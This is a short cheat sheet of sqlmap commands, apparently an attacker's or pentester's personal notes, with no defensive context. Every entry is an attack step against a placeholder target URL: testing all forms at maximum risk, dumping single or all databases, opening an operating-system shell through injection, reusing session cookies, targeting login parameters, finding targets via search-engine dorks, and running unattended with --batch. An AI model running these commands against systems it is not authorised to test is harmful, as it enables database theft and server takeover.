# Crawl the web page and test all forms (Requires a lot of user interaction)
``` sqlmap -u $url --crawl --forms --level 5 --risk 3 ```

# Enter sqlmap interactive shell

```sqlmap --shell```

# Test for write privileges and get a shell

``` sqlmap -u $url --os-shell```

# Enumerate databases

```sqlmap -u $url --dbs```

# Dump databases

```sqlmap -u $url --dump```

## Most often I use something like:

```sqlmap -u $url --dump --crawl --forms --level 5 --risk 3```

### And/Or

```sqlmap -u $url --dump --crawl=2 --forms --level 5 --risk 3```
```sqlmap -u $url --dump-all --crawl=2 --forms --level 5 --risk 3```
```sqlmap -u $url --dump --cookie=$cookie --level 5 --risk 3```
```sqlmap -u $url --os-shell --cookie=$cookie --level 5 --risk 3```
```sqlmap -u $url -p=username --dump --cookie=$cookie --level 5 --risk 3```
```sqlmap -u $url -p=password --dump --cookie=$cookie --level 5 --risk 3```
```sqlmap -u $url -p=search --dump --cookie=$cookie --level 5 --risk 3```

# Session Handling

```sqlmap -u $url --cookie=$cookie --level=5 --risk=3 --forms```
```sqlmap -u $url --cookie=$cookie --forms --level=5 --risk=3 --forms```

# SQLMap'ing with OSINT

```sqlmap -u $url -g site: --level=5 --risk=3 --forms```
```sqlmap -u $url -g url: --level=5 --risk=3 --forms```
```sqlmap -u $url -g page: --level=5 --risk=3 --forms```

# Interaction(less) sqlmap

 - Append ```--batch``` to any of the previous commands
